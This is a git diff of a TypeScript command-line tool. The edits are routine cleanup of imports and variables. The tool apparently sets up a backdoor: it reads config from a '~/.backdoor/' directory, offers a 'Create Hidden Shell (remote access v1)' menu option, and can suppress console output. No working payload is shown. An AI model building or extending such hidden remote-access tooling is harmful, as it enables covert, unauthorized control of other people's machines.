@@ -2,23 +2,23 @@
 /* eslint-disable no-case-declarations */
 import boxen from 'boxen';
 process.argv = process.argv.slice(1); // nex
-import yargs, {boolean, config} from 'yargs';
+import yargs, {config} from 'yargs';
 import 'colors';
 // eslint-disable-next-line @typescript-eslint/ban-ts-ignore
 // @ts-ignore
 import {select, confirm, text} from 'input';
-import {exec, spawn} from 'child-process-promise';
-import {ascii, windowClear, sleep} from './helpers';
-import {readFileSync, writeFileSync} from 'fs';
-import {join} from 'path';
-import {stdout} from 'process';
+import {exec} from 'child-process-promise';
+import {windowClear, sleep} from './helpers';
+// import {readFileSync, writeFileSync} from 'fs';
+// import {join} from 'path';
+// import {stdout} from 'process';
 // import child from 'child_process';
 const argv = yargs
   .usage('Usage: run `$0` and select what ya wanna do')
   .alias('d', 'default')
   .boolean(['d'])
   .describe('d', 'Use the config.json in the ~/.backdoor/ directory').argv;
-if (argv.default) console.log = (e: string) => {};
+if (argv.default) console.log = () => {};
 else windowClear();
 console.log(argv);
 
@@ -112,7 +112,7 @@ windowClear();
         return;
       case 'Create Hidden Shell (remote access v1)':
         try {
-          const {stdout} = await exec('screen -ls');
+          await exec('screen -ls');
         } catch (e) {
           if (e.stdout.includes('No Sockets found')) {
             //
